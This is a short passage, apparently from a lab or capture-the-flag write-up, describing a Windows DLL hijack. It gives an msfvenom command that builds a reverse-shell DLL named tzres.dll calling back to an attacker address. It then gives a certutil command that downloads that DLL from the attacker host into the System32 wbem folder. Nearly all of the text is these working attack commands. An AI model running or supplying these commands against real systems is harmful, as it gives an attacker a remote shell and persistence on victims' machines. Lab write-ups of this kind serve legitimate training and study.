So by this nature, we can use DLL hijack, so make the .dll:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.62 LPORT=135 -f dll -o tzres.dll

Then go to the C:\Windows\System32\wbem\ folder, then place our new DLL in there with this:

certutil.exe -urlcache -split -f http://192.168.49.62/tzres.dll
